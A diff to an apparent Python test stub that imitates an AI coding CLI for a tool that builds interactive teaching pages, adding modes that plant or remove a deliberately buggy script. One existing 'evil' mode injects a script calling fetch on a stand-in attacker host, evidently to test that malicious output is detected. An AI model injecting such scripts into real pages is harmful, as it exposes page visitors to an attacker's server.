@@ -226,7 +226,13 @@ elif "A student asks for a change to an interactive page" in prompt:
     mode = os.environ.get("FAKE_IEDIT", "ok")
     pg = cwd / "page.html"
     text = pg.read_text(encoding="utf-8")
-    if mode == "ok":
+    BUG_SCRIPT = "<script>const q = 1; q = 2;</script>"
+    listed = "Problems the automatic checker found" in prompt
+    if mode in ("rt", "fixbug") and listed:
+        text = text.replace(BUG_SCRIPT, "")
+    elif mode in ("rt", "rt_always"):
+        text = text.replace("</body>", BUG_SCRIPT + "</body>")
+    if mode in ("ok", "rt", "rt_always", "fixbug"):
         text = text.replace("</body>", "<p id='added'>Mass slider added.</p></body>")
     elif mode == "evil":
         text = text.replace("</body>", "<script>fetch('https://evil.example/x');</script></body>")
@@ -263,7 +269,10 @@ elif "explanation.md" in prompt:
     (cwd / "explanation.md").write_text("# Intuition\n\nMultiplying by $i$ rotates by $90^\circ$.\n", encoding="utf-8")
     (cwd / "result.json").write_text(json.dumps({"title": "Why multiplying by i rotates", "topic": "complex-numbers"}))
 elif "page.html" in prompt:
-    (cwd / "page.html").write_text("<!DOCTYPE html><html><head><meta charset='utf-8'><title>t</title></head><body>" + "x" * 600 + "</body></html>")
+    BUG_SCRIPT = "<script>const q = 1; q = 2;</script>"
+    (cwd / "page.html").write_text("<!DOCTYPE html><html><head><meta charset='utf-8'><title>t</title></head><body><input id='s' type='range'><canvas id='c'></canvas>"
+                                   + ("<p>x</p>" * 40) + "<script>let a = 0;\n" + "document.getElementById('s').addEventListener('input', e => { a = +e.target.value; });\n" * 6 + "</script>"
+                                   + (BUG_SCRIPT if os.environ.get("FAKE_NEWPAGE") == "bug" else "") + "</body></html>")
     (cwd / "result.json").write_text(json.dumps({"title": "Complex plane explorer", "topic": "complex-numbers"}))
 # what `claude -p --output-format stream-json --verbose` prints: an init line, events, then the result
 print(json.dumps({"type": "system", "subtype": "init", "session_id": "s", "tools": ["Read"], "apiKeySource": "none"}))
